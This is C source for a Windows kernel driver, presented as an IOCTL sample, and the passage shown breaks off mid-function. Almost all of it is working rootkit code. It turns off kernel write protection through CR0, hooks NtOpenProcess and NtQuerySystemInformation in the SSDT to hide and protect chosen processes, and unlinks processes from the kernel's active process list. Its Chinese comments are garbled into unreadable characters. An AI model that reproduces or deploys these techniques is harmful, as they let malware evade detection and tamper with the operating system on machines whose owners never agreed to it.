//
//                       _oo0oo_
//                      o8888888o
//                      88" . "88
//                      (| -_- |)
//                      0\  =  /0
//                    ___/`---'\___
//                  .' \\|     |// '.
//                 / \\|||  :  |||// \
//                / _||||| -:- |||||- \
//               |   | \\\  -  /// |   |
//               | \_|  ''\---/''  |_/ |
//               \  .-\__  '-'  ___/-. /
//             ___'. .'  /--.--\  `. .'___
//          ."" '<  `.___\_<|>_/___.' >' "".
//         | | :  `- \`.;`\ _ /`;.`/ - ` : | |
//         \  \ `_.   \_ __\ /__ _/   .-` /  /
//     =====`-.____`.___ \_____/___.-`___.-'=====
//                       `=---='
//
//
//     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
//
//               ���汣��         ����BUG
//
//
//
/***************************************************************************************
* AUTHOR : EvilKnight
* DATE   : 2014-7-6
* MODULE : ProcessManageSys.C
* 
* Command: 
*	Source of IOCTRL Sample Driver
*
* Description:
*		Demonstrates communications between USER and KERNEL.
*
****************************************************************************************
* Copyright (C) 2014 EvilKnight.
****************************************************************************************/

//#######################################################################################
//# I N C L U D E S
//#######################################################################################

#ifndef CXX_PROCESSMANAGESYS_H
#include "ProcessManageSys.h"
#include "kernelUsermanage.h"
#endif

extern "C"
{
        extern PServiceDescriptorTable KeServiceDescriptorTable;
}

extern "C" PUCHAR PsGetProcessImageFileName(PEPROCESS EProcess); 

const ULONG uMaxProtectCount(16) ;


PDEVICE_EXTENSION g_pde = NULL ;


UCHAR g_ProtectProcess[uMaxProtectCount][16] = {0} ; // Ҫ�����Ľ���������
ULONG g_uProtectProcessCount = 0 ;                                   // ������
ULONG g_ProtectProcessPID[uMaxProtectCount] = {0} ; // Ҫ�����Ľ���pid����
ULONG g_uProtectProcessPIDCount = 0 ;                              // ������

typedef NTSTATUS 
(* PNtOpenProcessPFU)(
                     OUT PHANDLE             ProcessHandle,
                     IN ACCESS_MASK          AccessMask,
                     IN POBJECT_ATTRIBUTES   ObjectAttributes,
                     IN PCLIENT_ID           ClientId 
                     ) ;

typedef  NTSTATUS
(* PNtQuerySystemInformationPFU)(
                          IN ULONG SystemInformationClass,
                          OUT PVOID SystemInformation,
                          IN ULONG SystemInformationLength,
                          OUT PULONG ReturnLength OPTIONAL
                          );

typedef NTSTATUS
(* PNtTerminateProcessPFU)(
                   IN HANDLE  ProcessHandle,
                   IN NTSTATUS  ExitStatus
                   );

PNtOpenProcessPFU                        g_pNtOpenProcess = NULL;
PNtQuerySystemInformationPFU      g_pNtQuerySystemInformation = NULL ;
PNtTerminateProcessPFU                 g_pNtTerminateProcess = NULL ;
//#include "struct.h"

//////////////////////////////////////////////////////////////////////////

//#######################################################################################
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//@@@@@@@@				D R I V E R   E N T R Y   P O I N T						 @@@@@@@@
//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
//#######################################################################################

/*******************************************************************************
*
*   �� �� �� : DriverEntry
*  �������� : D R I V E R   E N T R Y   P O I N T 
*  �����б� : pDriverObj    --  
*                 pRegistryString
*   ˵      �� : 
*  ���ؽ�� : 
*
*******************************************************************************/
NTSTATUS  DriverEntry(IN PDRIVER_OBJECT pDriverObj, 
                                        IN PUNICODE_STRING pRegistryString)
{
        NTSTATUS		status = STATUS_SUCCESS;
        UNICODE_STRING  ustrLinkName;
        UNICODE_STRING  ustrDevName;  
        PDEVICE_OBJECT  pDevObj;
        PDEVICE_EXTENSION pde = NULL ;
        int i = 0;

        dprintf("ProcessManageSys Driver\r\n"
            "Compiled %s %s\r\nIn DriverEntry : %wZ\r\n",
                        __DATE__, __TIME__, pRegistryString);

        // Register dispatch routines
/*
        for(i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        {
                pDriverObj->MajorFunction[i] = DispatchCommon;  
        }
*/
        pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
        pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;

        // Dispatch routine for communications
        pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchDeviceControl;

        // Unload routine
        pDriverObj->DriverUnload = DriverUnload;

        // Initialize the device name.
        RtlInitUnicodeString(&ustrDevName, NT_DEVICE_NAME);

        // Create the device object and device extension
        status = IoCreateDevice(pDriverObj, 
                                                sizeof(DEVICE_EXTENSION),
                                                &ustrDevName, 
                                                FILE_DEVICE_UNKNOWN,
                                                0,
                                                FALSE,
                                                &pDevObj);

        if(!NT_SUCCESS(status))
        {
                dprintf("Error, IoCreateDevice = 0x%x\r\n", status);
                return status;
        }

        //// Get a pointer to our device extension
        //deviceExtension = (PDEVICE_EXTENSION) deviceObject->DeviceExtension;
        pde = (PDEVICE_EXTENSION)(pDevObj->DeviceExtension) ;
        g_pde = pde ;

        //// Save a pointer to the device object
        //deviceExtension->DeviceObject = deviceObject;

        if(IoIsWdmVersionAvailable(1,0x10))
        {
                //�����֧�ַ��������û�����Ե�ϵͳ
                RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_GLOBAL_NAME);
        }
        else
        {
                //��֧��
                RtlInitUnicodeString(&ustrLinkName, SYMBOLIC_LINK_NAME);
        }
        
        // Create a symbolic link to allow USER applications to access it. 
        status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);  
        
        if(!NT_SUCCESS(status))
        {
                dprintf("Error, IoCreateSymbolicLink = 0x%x\r\n", status);
                
                IoDeleteDevice(pDevObj); 
                return status;
        }	

        //
        //	TODO: Add initialization code here.
        //

        // �ɹ�֮��Ϳ�ʼ��ʼ�����ǵ��豸��չ�ṹ����
        InitlizedDeviceExtension(pde) ;

        // ����Ҳ�����������
        //if(NT_SUCCESS(PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, FALSE)))
        //{
        //        // ���������
        //        pde->bIsSetCreateProcessNotifyRoutine = true ;
        //}

        // �ҹ�NtOpenProcess
        if(HookNtOpenProcess(pDevObj))
        {
                pde->bIsHookNtOpenProcess = true ;
        }

        // �ҹ�NtQuerySystemInformation
        if(HookNtQuerySystemInformation(pDevObj))
        {
                pde->bIsHookNtQuerySystemInformation = true ;
        }


        //// Tell the I/O Manger to do BUFFERED IO
        // ��д����ʹ�û�������ʽ�����û�ģʽ����
        // һ��ֻ����һ���̴߳��豸���
        pDevObj->Flags |= DO_BUFFERED_IO | DO_EXCLUSIVE ;

        // �Ƴ���ʼ��־
        pDevObj->Flags &= ~DO_DEVICE_INITIALIZING ;

        //// Save the DeviveObject
        InitializeKernelUserManage() ;
        Test() ;

        dprintf("DriverEntry Success\r\n");

        return STATUS_SUCCESS;
}

// ��ʼ��Device_Extension������һЩƫ�Ƶ�ֵ
/*******************************************************************************
*
*   �� �� �� : InitlizedDeviceExtension
*  �������� : ��ʼ��DeviceExtension��һЩSSDT����������ϵͳ�ṹ��ƫ��ֵ
*  �����б� : pde    --  PDEVICE_EXTENSION �ṹ��
*   ˵      �� : 
*  ���ؽ�� : �����ɹ�����true,ʧ�ܷ���false
*
*******************************************************************************/
bool InitlizedDeviceExtension(PDEVICE_EXTENSION pde)
{
        RTL_OSVERSIONINFOW osi ={0} ;
        osi.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW) ;
        RtlGetVersion(&osi) ;

        if (NULL == pde)
        {
                return false ;
        }

        KeInitializeMutex(&pde->DeviceIoControlMutex, 0) ;
        KeInitializeMutex(&pde->MyThreadMutex, 0) ;

        // �ж�ϵͳ�汾�������Ӧ��ֵ
        switch(osi.dwPlatformId)
        {
                case VER_PLATFORM_WIN32_NT:
                {
                        switch(osi.dwMajorVersion)
                        {
                        case 0:
                        case 1:
                        case 2:
                        case 3:
                        case 4:
                                // ����Ļ���Windows NTϵͳ
                                // �����Ӧ�Ĵ���
                                {
                                }
                                break ;
                        // 2k xp 2003
                        case 5:
                                {
                                        switch(osi.dwMinorVersion)
                                        {
                                        // 2000��ϵͳ
                                        case 0:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 151 ;
                                                        pde->uNtOpenProcessIndex = 106 ;
                                                }
                                                break ;
                                        // xp��ϵͳ
                                        case 1:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 173 ;
                                                        pde->uNtOpenProcessIndex = 122 ;
                                                        pde->uActiveProcessLinksOffset = 0x88 ;
                                                        pde->UniqueProcessIdOffset      = 0x84 ;
                                                }
                                                break ;
                                        // 2003��ϵͳ
                                        case 2:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 181 ;
                                                        pde->uNtOpenProcessIndex       = 128 ;
                                                        pde->uActiveProcessLinksOffset = 152 ;
                                                        pde->UniqueProcessIdOffset      = 148 ;
                                                }
                                                break ;
                                        }// end of switch(osi.dwMinorVersion)
                                } // end of case 5
                                break ;
                        // vista 2008 win 7
                        case 6:
                                {
                                        switch(osi.dwMinorVersion)
                                        {
                                         // vista 2008
                                        case 0:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 248 ; 
                                                        pde->uNtOpenProcessIndex = 194 ;
                                                }
                                                break ;
                                        // win 7     2008 r2
                                        case 1:
                                                {
                                                        pde->uNtQuerySystemInformationIndex = 260 ;
                                                        pde->uNtOpenProcessIndex = 189 ;
                                                        pde->uActiveProcessLinksOffset = 0xb8 ;
                                                        pde->UniqueProcessIdOffset      = 0xb4 ;
                                                }
                                                break ;
                                        }
                                }
                                break ;
                        default:
                                break ;
                        }
                }
                break ;

        }

        return true ;
}

/*******************************************************************************
*
*   �� �� �� : DriverUnload
*  �������� : DriverUnload
*  �����б� : pDriverObj    --  
*   ˵      �� : 
*  ���ؽ�� : 
*
*******************************************************************************/
VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
{	
        UNICODE_STRING strLink;
        PDEVICE_EXTENSION pde = (PDEVICE_EXTENSION)pDriverObj->DeviceObject->DeviceExtension ;

        // Unloading - no resources to free so just return.
        dprintf("Unloading...\r\n");
        //
        // TODO: Add uninstall code here.
        //

        if (pde->bIsSetCreateProcessNotifyRoutine)
        {
                PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, TRUE) ;
        }

        // ����ҹ���NtOpenProcess
        if (pde->bIsHookNtOpenProcess)
        {
                UnHookNtOpenProcess(pDriverObj->DeviceObject) ;
        }

        // ����ҹ���NtQuerySystemInformation
        if (pde->bIsHookNtQuerySystemInformation)
        {
                UnHookNtQuerySystemInformation(pDriverObj->DeviceObject) ;
        }
        
        // Delete the symbolic link
        if(IoIsWdmVersionAvailable(1,0x10))
        {
                //�����֧�ַ��������û�����Ե�ϵͳ
                RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_GLOBAL_NAME);
        }
        else
        {
                //��֧��
                RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
        }
        IoDeleteSymbolicLink(&strLink);

        // Delete the DeviceObject
        IoDeleteDevice(pDriverObj->DeviceObject);

        ReleaseKernelUserManage() ;

        dprintf("Unloaded Success\r\n");

        return;
}

/*******************************************************************************
*
*   �� �� �� : DispatchCreate
*  �������� : 
*  �����б� : pDriverObj    --  
*                  pIrp
*   ˵      �� : 
*  ���ؽ�� :  �ɹ����� STATUS_SUCCESS
*
*******************************************************************************/
NTSTATUS DispatchCreate(IN PDEVICE_OBJECT pDevObj, 
                                                IN PIRP pIrp)
{
        UNREFERENCED_PARAMETER(pDevObj) ;
        pIrp->IoStatus.Status = STATUS_SUCCESS;
        pIrp->IoStatus.Information = 0;

        IoCompleteRequest(pIrp, IO_NO_INCREMENT);

        return STATUS_SUCCESS;
}

/*******************************************************************************
*
*   �� �� �� : DispatchClose
*  �������� : 
*  �����б� : pDriverObj    --  
*                  pIrp
*   ˵      �� : 
*  ���ؽ�� :  �ɹ����� STATUS_SUCCESS
*
*******************************************************************************/
NTSTATUS DispatchClose(IN PDEVICE_OBJECT pDevObj, 
                                        IN PIRP pIrp)
{
        PDEVICE_EXTENSION pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;
        pIrp->IoStatus.Status = STATUS_SUCCESS;
        pIrp->IoStatus.Information = 0;

        IoCompleteRequest(pIrp, IO_NO_INCREMENT);

        // Return success
        return STATUS_SUCCESS;
}

/*******************************************************************************
*
*   �� �� �� : DispatchCommon
*  �������� : 
*  �����б� : pDriverObj    --  
*                  pIrp
*   ˵      �� : 
*  ���ؽ�� :  �ɹ����� STATUS_SUCCESS
*
*******************************************************************************/
NTSTATUS DispatchCommon(IN PDEVICE_OBJECT pDevObj, 
                                              IN PIRP pIrp)
{
        UNREFERENCED_PARAMETER(pDevObj) ;
        pIrp->IoStatus.Status = STATUS_SUCCESS;
        pIrp->IoStatus.Information = 0L;

        IoCompleteRequest( pIrp, 0 );

        // Return success
        return STATUS_SUCCESS;
}

/*******************************************************************************
*
*   �� �� �� : DispatchDeviceControl
*  �������� : 
*  �����б� : pDriverObj    --  
*                  pIrp
*   ˵      �� : 
*  ���ؽ�� :  �ɹ����� STATUS_SUCCESS
*
*******************************************************************************/
NTSTATUS DispatchDeviceControl(IN PDEVICE_OBJECT pDevObj, 
                                                     IN PIRP pIrp)
{
        NTSTATUS status               = STATUS_INVALID_DEVICE_REQUEST;	 // STATUS_UNSUCCESSFUL
        PIO_STACK_LOCATION pIrpStack  = IoGetCurrentIrpStackLocation(pIrp);
        ULONG uIoControlCode         = 0;
        PVOID pIoBuffer                     = NULL;
        ULONG uInSize                       = 0;
        ULONG uOutSize                    = 0;
        PHIDE_INFO pHi                      = NULL ;
        PPROTECT_PID_INFO pPi         = NULL ;
        PPROTECT_NAME_INFO  pNi  = NULL ;
        PDEVICE_EXTENSION pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        // Get the IoCtrl Code
        uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;

        // Get the buffer info
        pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
        uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
        uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;


        KdBreakPoint() ;
        KeWaitForSingleObject(&pde->DeviceIoControlMutex, 
                                                Executive,
                                                KernelMode,
                                                FALSE,
                                                NULL) ;

        switch(uIoControlCode)
        {
        // ���Ҫ�����Ľ�����
        case IOCTRL_ADD_PROTECT_NAME:
                {
                        pNi = (PPROTECT_NAME_INFO)pIoBuffer ;
                        if (sizeof(PROTECT_NAME_INFO) != uInSize || NULL == pNi)
                        {
                                break ;
                        }
                        // ��������ж�һ�·���ֵ
                        if(AddProtectProcessName(pNi->ProcessName))
                        {
                                status = STATUS_SUCCESS ;
                        }
                }
                break ;
        case IOCTRL_ADD_PROTECT_PID:
                {
                        pPi = (PPROTECT_PID_INFO)pIoBuffer ;
                        if (sizeof(PROTECT_PID_INFO) != uInSize || NULL == pPi)
                        {
                                break ;
                        }
                        // ��������ж�һ�·���ֵ
                        if( AddProtectProcessPID(pPi->uPID))
                        {
                                status = STATUS_SUCCESS ;
                        }
                }
                break ;
                // �������ؽ���
                case IOCTRL_HIDE:
                        {
                                // Receive data form Application
                                //dprintf("IOCTRL_HIDE\r\n");

                                // Do we have any data?
                                // �жϴ������Ĳ����Ƿ���ȷ
                                pHi = (PHIDE_INFO)pIoBuffer ;
                                if (sizeof(HIDE_INFO) != uInSize || NULL == pHi)
                                {
                                        break ;
                                }
                                // ��������ж�һ�·���ֵ
                                if( HideProcess(pDevObj, pHi->uPID) )
                                {
                                        status = STATUS_SUCCESS ;
                                }
                        }
                        break ;
                case IOCTRL_START_FILTER:
                        {
                                if (! pde->bIsFiltrateProcess)
                                {
                                        pde->bIsFiltrateProcess = true ;
                                        status = STATUS_SUCCESS ;
                                }
                        }
                        break ;
                case IOCTRL_STOP_FILTER:
                        {
                                if (pde->bIsFiltrateProcess)
                                {
                                        pde->bIsFiltrateProcess = false ;
                                        status = STATUS_SUCCESS ;
                                }
                        }
                        break ;
                //
                // TODO: Add execute code here.
                //

                default:
                        {
                                // Invalid code sent
                                dprintf("Unknown IOCTL: 0x%X (%04X,%04X)\r\n", 
                                          uIoControlCode,
                                          DEVICE_TYPE_FROM_CTL_CODE(uIoControlCode),
                                          IoGetFunctionCodeFromCtlCode(uIoControlCode));
                                status = STATUS_INVALID_PARAMETER;	
                        }
                        break;
        }

        if(status == STATUS_SUCCESS)
        {
                pIrp->IoStatus.Information = uOutSize;
        }
        else
        {
                pIrp->IoStatus.Information = 0;
        }

        // Complete the I/O Request
        pIrp->IoStatus.Status = status;

        KeReleaseMutex(&pde->DeviceIoControlMutex, FALSE) ;
        IoCompleteRequest(pIrp, IO_NO_INCREMENT);
        
        return status;
}


/*******************************************************************************
*
*   �� �� �� : HideProcess
*  �������� : ���ؽ��� 
*  �����б� : pHi    --  ���ؽ��̲����ṹ��
*   ˵      �� : ͨ��ActiveProcessLinks������ʵ��
*  ���ؽ�� : �ɹ�����TRUE��ʧ�ܷ���FALSE
*
*******************************************************************************/
bool HideProcess(IN PDEVICE_OBJECT pDevObj, ULONG uPID)
{
        bool bResult = false ;
        PLIST_ENTRY  pCur ;
        PEPROCESS  pCurrentEprocess  = NULL; 
        KIRQL oldIrql ;
        PDEVICE_EXTENSION pde = NULL ;

        if (NULL == pDevObj)
        {
                return bResult ;
        }
        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;
        if (NULL == pde)
        {
                return bResult ;
        }

        if(!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)uPID, &pCurrentEprocess)))
        {
                return bResult ;
        }
        
        oldIrql = KeRaiseIrqlToDpcLevel() ;

        // ����ҵ��Ļ�����ʼ������
        pCur =(PLIST_ENTRY)((char *)pCurrentEprocess + pde->uActiveProcessLinksOffset ) ; // ȡ�õ�ǰ��List
        
        // ���һ���ǲ��ǿ������ͬʱ�ټ��һ����һ���ڵ����һ���ڵ��ǲ��Ƕ�ָ���Լ�
        if(pCur->Blink != pCur
                && pCur->Flink != pCur
                && pCur->Blink->Flink == pCur
                && pCur->Flink->Blink == pCur)
        {
                // ��һ����BLink��ָ��ǰ��һ���ڵ�
                pCur->Flink->Blink = pCur->Blink ;
                // ��һ���ڵ��ָ����һ���ڵ����ָ��ǰ�ڵ����һ���ڵ�
                pCur->Blink->Flink = pCur->Flink ;
                // �ܽ�������������ǰ������ڵ������Լ�

                // �����Լ�ָ���Լ���
                pCur->Blink = pCur->Flink = pCur ;
                bResult = true ; 
        }

        KeLowerIrql(oldIrql) ;
        ObDereferenceObject((void *)pCurrentEprocess) ;
        return bResult ;

}

/*******************************************************************************
*
*   �� �� �� : PageProtectOFF
*  �������� : ȥ��ҳ�汣�� 
*  �����б� : 
*   ˵      �� : 
*  ���ؽ�� : ��
*
*******************************************************************************/
void PageProtectOFF(void)
{
        __asm //ȥ��ҳ�汣��
        {
                push eax
                cli
                mov eax,cr0
                and eax,not 10000h //and eax,0FFFEFFFFh
                mov cr0,eax
                pop eax
        }
}

/*******************************************************************************
*
*   �� �� �� : PageProtectON
*  �������� : ����ҳ�汣�� 
*  �����б� : 
*   ˵      �� : 
*  ���ؽ�� : ��
*
*******************************************************************************/
void PageProtectON(void)
{
        __asm
        {
                push eax
                mov eax,cr0
                or eax,10000h //or eax,not 0FFFEFFFFh
                mov cr0,eax
                sti
                pop eax
        }
}

/*******************************************************************************
*
*   �� �� �� : MyMemCopy
*  �������� : ����ָ����ַָ�����ȵ����ݵ�Ŀ���ַ
 
*  �����б� : 
*   ˵      �� : 
*  ���ؽ�� : ��
*
*******************************************************************************/
bool MyMemCopy(PUCHAR pDstAddr, PUCHAR* pSrcAddr, ULONG uSrcSize)
{
        KIRQL  Irql;
        PAGED_CODE() ;
        if(NULL == pDstAddr
                || NULL == pSrcAddr)
        {
                return false ;
        }

        PageProtectOFF();

        //����IRQL�жϼ�
        Irql=KeRaiseIrqlToDpcLevel();

        if (pSrcAddr[0] != 0) //��������Ϊ��
        {
                memcpy((PVOID)pDstAddr, pSrcAddr, uSrcSize);
        }

        //�ָ�Irql
        KeLowerIrql(Irql);

        PageProtectON();
        return true ;
}

/*******************************************************************************
*
*   �� �� �� : CreateProcessNotifyRoutine
*  �������� : �жϴ����Ľ����Ƿ�Ϊ�ܾ����г����ǵĻ�����
*  �����б� : 
*   ˵      �� : ͨ��PIDȡ��EPROCESS�����ٴ�����ȡ�����ж��Ƿ�Ϊ�ܾ����е�
*                   �����ǵĻ���ͨ��PID�򿪽��̣���������
*   ���ؽ�� : ��
*
*******************************************************************************/
VOID CreateProcessNotifyRoutine (IN HANDLE  ParentId,
                                 IN HANDLE  ProcessId,
                                 IN BOOLEAN  Create )
{
        PEPROCESS pEProcess = NULL ;
        OBJECT_ATTRIBUTES ObjectAttributes;
        CLIENT_ID clientid;
        HANDLE handle ;
        return ;

        // ���̴���
        if (Create)
        {
                if (0 != ProcessId)
                {
                        if(NT_SUCCESS(PsLookupProcessByProcessId(ProcessId, &pEProcess)))
                        {
                                ObDereferenceObject(pEProcess) ;
                                // ��������ٱ�һ�½�����
                                InitializeObjectAttributes(&ObjectAttributes, 0 ,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);
                                clientid.UniqueProcess = (HANDLE)ParentId;
                                clientid.UniqueThread=0;
                                if(NT_SUCCESS(ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &ObjectAttributes, &clientid)))
                                {
                                        ZwTerminateProcess(handle, 0) ;
                                }
                        }
                }
        }
        // �����˳�
        else
        {
        }
}

/*******************************************************************************
*
*   �� �� �� : DetoursNtOpenProcess
*  �������� : ����NtOpenProcess����
*  �����б� : 
*   ˵      �� : �ж��Ƿ�Ҫ������Ҫ�����Ľ��̣��ǵĻ�ֱ�ӷ���Ȩ�޴���
*  ���ؽ�� : 
*
*******************************************************************************/
NTSTATUS  DetoursNtOpenProcess(
                               OUT PHANDLE             ProcessHandle,
                               IN ACCESS_MASK          AccessMask,
                               IN POBJECT_ATTRIBUTES   ObjectAttributes,
                               IN PCLIENT_ID           ClientId) 
{
        //dprintf("DetoursNtOpenProcess\r\n") ;
        //KdBreakPoint() ;
        if (NULL == g_pNtOpenProcess)
        {
                return STATUS_UNSUCCESSFUL ;
        }

        // ���￪ʼ����򿪽��̣��ж��ǲ�������Ҫ�����Ľ���
        if (NULL != ClientId 
                && 0 != ClientId->UniqueProcess)
        {
                if(isProtectProcess(ClientId))
                {
                        return STATUS_ACCESS_DENIED ;
                }
        }

        return g_pNtOpenProcess(ProcessHandle,
								AccessMask,
								ObjectAttributes,
								ClientId) ; 
}

// SSDT Hook NtOpenProcess
/*******************************************************************************
*
*   �� �� �� : HookNtOpenProcess
*  �������� : Hook NtOpenProcess
*  �����б� : pDevObj             --    DeviceObject����
*   ˵      �� : 
*  ���ؽ�� :  �ҹ��ɹ�����true, ʧ�ܷ���false
*
*******************************************************************************/
bool HookNtOpenProcess(IN PDEVICE_OBJECT pDevObj) 
{
        KIRQL kIrql ;
        PDEVICE_EXTENSION pde = NULL ;
        PULONG pSSDT =  (PULONG)(KeServiceDescriptorTable->ServiceTableBase);

        if (NULL == pDevObj)
        {
                return false ;
        }

        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        // Hook
        g_pNtOpenProcess = (PNtOpenProcessPFU) pSSDT[pde->uNtOpenProcessIndex];
        PageProtectOFF() ;
        kIrql = KeRaiseIrqlToDpcLevel() ;
        pSSDT[pde->uNtOpenProcessIndex] = (ULONG)DetoursNtOpenProcess;
        KeLowerIrql(kIrql) ;
        PageProtectON() ;
        return true ;
}

/*******************************************************************************
*
*   �� �� �� : UnHookNtOpenProcess
*  �������� : ж��NtOpenProcess����
*  �����б� : pDevObj        ---            �豸����
*   ˵      �� : 
*  ���ؽ�� :  �ɹ�����true,ʧ�ܷ���false
*
*******************************************************************************/
bool UnHookNtOpenProcess(IN PDEVICE_OBJECT pDevObj) 
{
        KIRQL kIrql ;
        PDEVICE_EXTENSION pde = NULL ;
        PULONG pSSDT =  (PULONG)(KeServiceDescriptorTable->ServiceTableBase);

        if (NULL == pDevObj)
        {
                return false ;
        }

        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        if (! pde->bIsHookNtOpenProcess || NULL == g_pNtOpenProcess)
        {
                return false ;
        }

        // Hook
        PageProtectOFF() ;
        kIrql = KeRaiseIrqlToDpcLevel() ;
        // ��ԭ����ֵд��ȥ
        pSSDT[pde->uNtOpenProcessIndex] = (ULONG)g_pNtOpenProcess;
        g_pNtOpenProcess = NULL ;
        KeLowerIrql(kIrql) ;
        PageProtectON() ;
        return true ;
}


/*******************************************************************************
*
*   �� �� �� : DetoursNtQuerySystemInformation
*  �������� : ����NtQuerySystemInformation����
*  �����б� : 
*   ˵      �� : 
*  ���ؽ�� :  
*
*******************************************************************************/
NTSTATUS DetoursNtQuerySystemInformation (
                                 IN ULONG SystemInformationClass,
                                 OUT PVOID SystemInformation,
                                 IN ULONG SystemInformationLength,
                                 OUT PULONG ReturnLength OPTIONAL
                                 )
{
        
        //dprintf("DetoursNtQuerySystemInformation\r\n") ;
        NTSTATUS ntStatus = STATUS_UNSUCCESSFUL ;

        // ��������ָ���Ƿ�Ϊ��
        if (NULL == g_pNtQuerySystemInformation)
        {
                return ntStatus ;
        }

        __try
        {

                // �ȵ���ԭ���ĺ���
                ntStatus =  g_pNtQuerySystemInformation(SystemInformationClass,
                                                                                SystemInformation,
                                                                                SystemInformationLength,
                                                                                ReturnLength) ;
                if(! NT_SUCCESS(ntStatus))
                {
                        __leave ;
                }

                // ���������һ������
                //if (g_pde->bIsFiltrateProcess)
                //{
                //        __leave ;
                //}
                

                // �������̵�ʱ����һ���Ƿ�Ҫ���˽��̣��ǵĻ�ֱ�ӷ���,����ʾ����
                if(5 == SystemInformationClass
                        && SystemInformationLength > 200)
                {
                        // Ȼ��ʼ������
                        PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)SystemInformation ;
                        if (0 == spi->NextEntryOffset)
                        {
                                __leave ;
                        }

                        PSYSTEM_PROCESS_INFORMATION fspi = (PSYSTEM_PROCESS_INFORMATION)( (DWORD)spi + spi->NextEntryOffset) ;
                        KdBreakPoint() ;

                        // ȡ�õ�ǰ���̵�uid
                        ULONG uCurrentUid = GetProcessUID((ULONG)PsGetCurrentProcessId()) ;
                        while ( spi->NextEntryOffset != 0 )
                        {
                                // ͨ��pidȡ��uid
                                ULONG uUid = GetProcessUID((ULONG)(fspi->UniqueProcessId)) ;
                                CLIENT_ID ClientId = {0} ;
                                ClientId.UniqueProcess = fspi->UniqueProcessId ;

                                // �����һ�������һ��ָ����һ��
                                if (uUid != uCurrentUid
                                        || isProtectProcess((PCLIENT_ID)&ClientId))
                                {
                                        fspi->UniqueProcessId = NULL;
                                        if (NULL != fspi->ImageName.Buffer)
                                        {
                                                RtlFillMemory(fspi->ImageName.Buffer, fspi->ImageName.Length, 0) ;
                                        }
                                        if (0 != fspi->NextEntryOffset)
                                        {
                                                spi->NextEntryOffset = (spi->NextEntryOffset + fspi->NextEntryOffset) ;
                                        }
                                        else
                                        {
                                                spi->NextEntryOffset = 0 ;
                                        }
                                }
                                // �ж��ǲ����Ƴ���
                                if(fspi != (PSYSTEM_PROCESS_INFORMATION)( (DWORD)spi + spi->NextEntryOffset))
                                {
                                        fspi = (PSYSTEM_PROCESS_INFORMATION)( (DWORD)spi + spi->NextEntryOffset) ;
                                }
                                else
                                {
                                        spi = fspi ;
                                        fspi = (PSYSTEM_PROCESS_INFORMATION)( (DWORD)fspi + fspi->NextEntryOffset) ;
                                }
                        }
                }       
        }

        __finally
        {
        }

        return ntStatus ;
}

// SSDT Hook NtQuerySystemInformation
/*******************************************************************************
*
*   �� �� �� : HookNtQuerySystemInformation
*  �������� : Hook NtQuerySystemInformation
*  �����б� : pDevObj             --    DeviceObject����
*   ˵      �� : 
*  ���ؽ�� :  �ҹ��ɹ�����true, ʧ�ܷ���false
*
*******************************************************************************/
bool HookNtQuerySystemInformation(IN PDEVICE_OBJECT pDevObj) 
{
        KIRQL kIrql ;
        PDEVICE_EXTENSION pde = NULL ;
        PULONG pSSDT =  (PULONG)(KeServiceDescriptorTable->ServiceTableBase);

        if (NULL == pDevObj)
        {
                return false ;
        }

        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        // Hook
        g_pNtQuerySystemInformation  = (PNtQuerySystemInformationPFU) pSSDT[pde->uNtQuerySystemInformationIndex];
        PageProtectOFF() ;
        kIrql = KeRaiseIrqlToDpcLevel() ;
        pSSDT[pde->uNtQuerySystemInformationIndex] = (ULONG)DetoursNtQuerySystemInformation;
        KeLowerIrql(kIrql) ;
        PageProtectON() ;
        return true ;
}

// SSDT UnHook NtQuerySystemInformation
/*******************************************************************************
*
*   �� �� �� : UnHookNtQuerySystemInformation
*  �������� : UnHook NtQuerySystemInformation
*  �����б� : pDevObj             --    DeviceObject����
*   ˵      �� : 
*  ���ؽ�� :  ж�ع��ӳɹ�����true, ʧ�ܷ���false
*
*******************************************************************************/
bool UnHookNtQuerySystemInformation(IN PDEVICE_OBJECT pDevObj)
{
        KIRQL kIrql ;
        PDEVICE_EXTENSION pde = NULL ;
        PULONG pSSDT =  (PULONG)(KeServiceDescriptorTable->ServiceTableBase);

        if (NULL == pDevObj)
        {
                return false ;
        }

        pde = (PDEVICE_EXTENSION)pDevObj->DeviceExtension ;

        if (! pde->bIsHookNtQuerySystemInformation 
                || NULL == g_pNtQuerySystemInformation)
        {
                return false ;
        }

        // Hook
        PageProtectOFF() ;
